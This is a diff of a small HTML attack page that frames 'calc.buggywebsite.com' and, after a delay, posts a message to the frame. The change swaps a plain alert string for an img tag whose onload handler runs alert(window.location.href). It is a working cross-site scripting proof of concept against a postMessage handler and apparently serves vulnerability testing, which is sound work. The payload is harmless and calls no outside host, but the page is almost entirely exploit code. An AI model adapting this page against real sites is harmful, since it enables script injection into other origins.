@@ -1,14 +1,14 @@
 <html>
 <body>
 <p>iframe below</p>
-				<iframe id="f" style="height:65px;width:100%; left:-100px; margin-top:-05px;margin-bottom:-30px;" frameBorder="0" src="http://calc.buggywebsite.com/frame.html"></iframe>
+				<iframe id="f" style="height:500px;width:100%;" frameBorder="0" src="http://calc.buggywebsite.com/frame.html"></iframe>
 <p>iframe above</p>
 <script>
 	console.log("howdy")
 	setTimeout(() => {
 		const iframe = document.getElementById('f');
 		console.log("Got iframe", iframe)
-		iframe.contentWindow.postMessage('alert(window.location.href)', '*');
+		iframe.contentWindow.postMessage('<img src="https://i.kym-cdn.com/photos/images/facebook/001/166/993/284.png" onload="alert(window.location.href)"/>', '*');
 	}, 1000)
 
 
